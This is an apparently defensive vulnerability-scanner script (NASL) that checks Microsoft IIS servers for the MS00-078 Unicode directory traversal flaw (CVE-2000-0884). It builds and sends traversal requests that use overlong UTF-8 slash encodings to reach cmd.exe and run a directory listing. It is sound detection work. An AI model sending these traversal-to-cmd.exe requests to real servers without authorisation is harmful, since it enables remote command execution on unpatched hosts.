# SPDX-FileCopyrightText: 2001 HD Moore
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10537");
  script_version("2024-08-08T05:05:42+0000");
  script_tag(name:"last_modification", value:"2024-08-08 05:05:42 +0000 (Thu, 08 Aug 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"IAVA", value:"2000-a-0005");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0884");
  script_name("Microsoft IIS Directory Traversal Vulnerability (MS00-078) - Active Check");
  script_category(ACT_ATTACK); # nb: Direct access to a .exe file might be already seen as an attack
  script_copyright("Copyright (C) 2001 HD Moore");
  script_family("Web Servers");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-078");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1806");

  script_tag(name:"solution", value:"The vendor has releases updates. Please see the references for more information.");

  script_tag(name:"summary", value:"The remote IIS server allows anyone to execute arbitrary commands
  by adding a unicode representation for the slash character in the requested path.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/"; # FP
dir[4] = "/_mem_bin/"; # FP
dir[5] = "/exchange/"; # OWA
dir[6] = "/pbserver/"; # Win2K
dir[7] = "/rpc/"; # Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%c0%af";
uni[1] = "%c0%9v";
uni[2] = "%c1%c1";
uni[3] = "%c0%qf";
uni[4] = "%c1%8s";
uni[5] = "%c1%9c";
uni[6] = "%c1%pc";
uni[7] = "%c1%1c";
uni[8] = "%c0%2f";
uni[9] = "%e0%80%af";

cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d = 0; dir[d]; d++) {
  for(u = 0; uni[u]; u++) {
    url = string(dir[d], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", cmd);
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if(!res)
      continue;

    if(("<DIR>" >< res) || ("Directory of C" >< res)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
